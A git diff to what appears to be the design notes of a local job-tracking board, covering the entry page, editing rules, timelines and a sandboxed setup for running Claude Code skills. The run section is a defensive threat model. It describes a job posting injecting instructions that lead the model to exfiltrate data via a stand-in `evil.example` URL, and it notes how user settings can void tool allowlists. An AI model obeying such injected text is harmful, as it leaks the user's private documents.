@@ -103,12 +103,30 @@ point — a SaaS tracker cannot be the input to `/rank`.
   different panel per card, and then nothing is ever where it was last time. What
   varies by stage is which *sections* apply — outcome tags only under Rejected —
   not where a value sits.
+- **Two readings of an entry, one set of components.** The popover is triage: four
+  lines, a decision, the next card. The job page is the other job the board does —
+  a live application, few of them, each consequential — and it holds what a 25rem
+  popover cannot: the job description itself, and the documents written for that
+  application. The rail beside the description is the same `job-details` components
+  the popover renders, so a value cannot read one way in one place and another way
+  in the other. The page is reached from a card, never from the app rail: it is one
+  entry, and a nav key that does nothing until you have picked a posting is a dead
+  key four times out of five.
+- **The description is read from the file, not from the entry.** `posting_file`
+  points into `documents/postings/`, and the page fetches it. Moving the text into
+  `data/jobs.json` would put ten kilobytes of employer prose per entry into the
+  file every CLI skill parses and `git diff` reviews.
+- **Documents are found through `application_dir`, never through a guessed slug.**
+  `/apply`, `/outcome` and `/research` set that field when they create the folder.
+  Rebuilding the folder name here out of company and title disagrees with what the
+  skill wrote the first time a company name has a dot in it, and the failure is
+  silent: an empty panel on an application that has four documents.
 - **The panel reads, the dialog writes.** What the posting *says* is a fact the
   user can correct better than any scraper — title, company, URL, work mode,
   salary, location, applied, apply deadline, posted, first seen, portal, stage —
-  and all of it is editable behind one **Edit posting** button rather than by
-  clicking into the reading. A panel where every value is also a control has no
-  resting state. What `/rank` *concluded* is not editable at all: the score, the
+  and from the popover all of it is editable behind one **Edit posting** button
+  rather than by clicking into the reading. A panel where every value is also a
+  control has no resting state. What `/rank` *concluded* is not editable at all: the score, the
   verdict and the four-axis breakdown are the one thing the user cannot reproduce
   by hand, and a board that lets you type over a score is a board whose scores mean
   nothing. `excluded_reason` is read-only on the same principle: it is the
@@ -127,9 +145,42 @@ point — a SaaS tracker cannot be the input to `/rank`.
 - **Rejected asks how it ended**, on every route in. The tags and an optional note
   go in with the status in one PATCH, and nothing ticked is the real answer "they
   said no" rather than an unanswered prompt.
-- A card has three ways to change stage (drag, popover picker, right-click
-  submenu) and they all write the same field. The right-click menu is also where
-  copy-to-clipboard and the dismissal live.
+- **The entry page writes in place**, and it is the one surface that does. The rule
+  above is about a popover glanced at during triage; the page is opened because that
+  one application *is* the work, and being sent to a dialog to fix a salary you are
+  looking at is the cost that rule was never meant to buy. The resting state is kept
+  by making the affordance the track's rather than the field's: nothing is outlined
+  until the pointer is in the block, and then every editable value picks up the same
+  dashed rule at once. Where there is no hover to reveal it — a touch screen — the
+  rule is simply there, quieter. `rank_*`, `fit` and `excluded_reason` stay read-only
+  on the page too; that half of the rule is not about which surface you are on.
+- **A stage date is corrected on the log row that states it**, never inside a rail
+  chevron: the rail is a reading and a stage control at once, and a value that is
+  also a date picker inside a button is neither.
+- **`notes` carries a dated log, and the page renders it as one.** Nothing in the
+  file logs events, so the running record of a live application goes into the note by
+  hand as `3 Jul: Screening` lines. Those are parsed back out and mixed with the
+  dates the entry already carries, so the hand-written story and the recorded stages
+  read as one sequence. No new field: every write rewrites a single line of `notes`
+  and leaves the rest byte for byte, so the CLI skills read what they always read and
+  a log entry is still a one-line diff. The year nobody writes down is inferred from
+  the sequence — the log is kept append-only, so each entry takes the earliest year
+  that keeps it on or after the one above it.
+- **A date ahead of today is a booking, not a wait.** Every reading in `dates.ts`
+  returns null for a future date rather than printing a negative age, so the entry
+  page splits those events off above a `now` rule instead of dropping them. What is
+  booked next is the most consequential thing on a live application.
+- **The rail keeps every stage; the run keeps only what happened.** `buildStages`
+  draws all seven slots so a missing date is visible as the thing worth filling in,
+  and `buildTimeline` leaves an undated stage out so nothing is interpolated. Two
+  readings of one set of dates, and the difference is deliberate.
+- **The description is read over the page, not as the page.** A JD is three thousand
+  words: set in the body it *is* the body, and everything the page exists to answer
+  ends up below it. It opens in the reading modal along with the CV, the prep and the
+  research, which is the one place this app sets prose.
+- A card has four ways to change stage (drag, popover picker, right-click submenu,
+  the entry page's rail) and they all write the same field. The right-click menu is
+  also where copy-to-clipboard and the dismissal live.
 - ⌘/Ctrl-click and ⇧-click select cards; a batch move or dismissal is one
   request and one file write, all-or-nothing. Capped at 500 entries.
 - `rank_location` holds the place the posting states, not a verdict on it. `/rank`
@@ -192,9 +243,63 @@ the user in a full redesign, and the constraints below are the standing ones.
 - **The accent is ink and one pixel, never a field.** One accent, spent on
   selection, focus and the drop target. Anything that lights it permanently
   makes those three read as ordinary.
+- **One hue is a state, two hues is a passage.** The timeline's colours carry a
+  gradient only where the object *is* a move: the card that just landed, the
+  dialog that asks about a move, the toast that reports it, the log spine
+  between two events, and the strip across the column headers. Never a fill,
+  never a neutral, and never the accent — a ramp cannot mark selection, and the
+  accent cannot say which two stages a move ran between. A **standing** reading
+  keeps its one flat hue: the stage rail was tried as a ramp and eight hues
+  blended end to end read as a spectrum, at the cost of a stage still being the
+  colour that stage is everywhere else.
 - **Density is the design.** This is an instrument for reading a queue in fast
   vertical passes, not a page. Tight radii, tight rhythm, tracks divided by
   rules rather than floating in gutters.
+
+## Running a Skill from the Board
+
+- **The board is a Claude Code client, not a Claude client.** `POST /api/run`
+  spawns the local `claude` CLI in the repo root, so a run uses the same
+  subscription, the same commands under `.claude/commands/` and the same files
+  the terminal does. No API key, no SDK.
+- **The client sends a command id, never a prompt.** `run-api.ts` holds the only
+  table that turns `{command: "rank", id: 12}` into `/rank #12`. An endpoint
+  that forwarded arbitrary text to a CLI with file write access in the repo root
+  would be a remote shell with extra steps.
+- **A job description is untrusted text, and it goes in the prompt.** So a run is
+  a deny-by-default session: `--permission-mode manual` with a hand-written
+  `--allowedTools`, writes scoped by path to `documents/**` and
+  `data/jobs.json`, and Bash removed outright. The mode flag is load-bearing and
+  not decoration: `--allowedTools` only ever *adds*, so on a machine whose user
+  settings carry `"defaultMode": "bypassPermissions"` the allowlist restricts
+  nothing at all. `.claude/commands/*.md` is deliberately outside the writable
+  paths, because a run that can rewrite the command files can grant itself
+  anything on the next one.
+- **`WebFetch` stays unscoped, and that is the residual risk.** `/research` and
+  `/apply` exist to read employer sites nobody can enumerate in advance, so a
+  posting that talks the model into fetching `evil.example/?q=<what it read>` is
+  possible. The commands carry the countermeasure in prose; prose is not a
+  sandbox.
+- **The board offers a command only where it is not already a control.** Bare
+  `/outcome` is the case that decided the rule: everything it writes back to an
+  entry - the status, the stage dates, the outcome tags - is a control in the
+  panel already, so a button for it read as the whole skill being pointless. It
+  stays a terminal command, and the board offers only its follow-up branch. What
+  the debrief uniquely produces, the `outcome.md` archive and the calibration
+  handoff into `/setup`, has no board equivalent and no board shortcut either.
+- **One run at a time.** A module-level lock in the server, 409 on collision.
+  Two skills writing `data/jobs.json` at once interleave into a file neither
+  meant to write.
+- **The transcript is working, not a record.** It is thrown away when the panel
+  shuts. What a run leaves behind is the file it wrote, which appears under
+  Documents on the same page. A kept conversation would be a second,
+  unversioned record of an application beside the one in `documents/`.
+- **The reply box exists for one reason.** `/apply` stops before it drafts and
+  asks whether to go ahead, and a run in `-p` mode has nobody to answer it.
+- **The hook is mounted in `App`, not on the job page.** The server kills the
+  child when the request closes, so whatever holds the fetch holds the run's
+  life. Hung off the page, walking back to the board mid-`/apply` would kill it
+  halfway through writing a CV.
 
 ## Evidence on Hand
 
